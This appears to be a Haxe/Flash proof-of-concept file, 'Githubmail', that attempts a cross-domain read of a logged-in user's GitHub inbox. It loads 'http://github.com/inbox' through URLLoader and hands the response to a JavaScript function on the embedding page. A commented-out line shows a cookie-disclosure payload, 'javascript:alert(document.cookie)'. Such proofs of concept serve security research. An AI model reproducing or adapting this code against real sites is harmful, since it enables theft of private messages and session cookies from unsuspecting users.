import flash.external.ExternalInterface;
import flash.net.URLLoader;
import flash.net.URLRequest;
import flash.Lib;
import flash.events.Event;
import flash.events.SecurityErrorEvent;

class Githubmail {
	static function completed(evt:Event) {
		var ldr:URLLoader = evt.currentTarget;
		trace("inside event handler");
		ExternalInterface.call("test", ldr.data);
	}

	static function error(event:SecurityErrorEvent) {
            trace("securityErrorHandler: " + event.text);
        }

	static function main() {
		var loader = new URLLoader();
        	loader.addEventListener(Event.COMPLETE, completed);
		loader.addEventListener(SecurityErrorEvent.SECURITY_ERROR, error);
		loader.load(new URLRequest("http://github.com/inbox"));
		// Lib.getURL(new URLRequest("javascript:alert(document.cookie)"), '_top');
    }
}

